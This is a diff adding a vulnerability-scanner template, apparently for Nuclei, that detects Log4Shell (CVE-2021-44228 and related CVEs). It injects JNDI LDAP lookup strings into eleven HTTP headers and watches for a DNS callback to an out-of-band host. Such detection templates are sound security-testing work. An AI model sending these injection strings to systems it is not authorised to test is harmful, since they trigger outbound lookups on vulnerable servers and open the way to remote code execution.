@@ -1,0 +1,37 @@
+id: log4j-rce-comprehensive
+
+info:
+  name: Log4j Remote Code Execution - Complete Detection
+  author: security-team
+  severity: critical
+  description: Comprehensive detection for Log4Shell vulnerabilities (CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832)
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2021-44228,CVE-2021-45046,CVE-2021-45105,CVE-2021-44832
+  tags: log4j,rce
+
+http:
+  # Basic LDAP JNDI injection
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/basic}"
+      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}/xff}"
+      X-Real-IP: "${jndi:ldap://{{interactsh-url}}/realip}"
+      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/api}"
+      X-Forwarded-Host: "${jndi:ldap://{{interactsh-url}}/host}"
+      Referer: "${jndi:ldap://{{interactsh-url}}/referer}"
+      CF-Connecting-IP: "${jndi:ldap://{{interactsh-url}}/cf}"
+      True-Client-IP: "${jndi:ldap://{{interactsh-url}}/true}"
+      X-Originating-IP: "${jndi:ldap://{{interactsh-url}}/orig}"
+      X-Remote-IP: "${jndi:ldap://{{interactsh-url}}/remote}"
+      X-Client-IP: "${jndi:ldap://{{interactsh-url}}/client}"
+    
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
